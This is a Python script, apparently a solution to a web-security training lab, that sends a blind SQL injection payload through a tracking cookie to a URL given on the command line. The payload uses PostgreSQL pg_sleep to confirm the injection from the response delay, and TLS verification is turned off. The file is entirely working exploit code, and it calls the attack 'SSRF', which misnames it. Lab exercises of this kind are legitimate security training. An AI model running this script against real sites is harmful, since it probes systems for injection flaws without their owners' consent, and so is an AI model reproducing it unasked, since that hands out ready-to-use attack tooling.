# Lab: Blind SSRF SQLi with time delays
import os
import sys
import urllib.parse
import requests
import urllib3
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def execute_time_delay(url):
    sqli_payload = "'|| SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)

    cookies = {"TrackingId": f"D7aiRUT9K5v5Xafw{sqli_payload_encoded}", "session": "dahdoy78nify879fyffiy99ey"}

    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

    if int(r.elapsed.total_seconds()) > 9:
        print("(-> SQLi Blind SSRF attack successful !!!")
    else:
        print("(-) SQLi Blind SSRF attack unsuccessful !!!")
        exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    execute_time_delay(url)


if __name__ == "__main__":
    main()
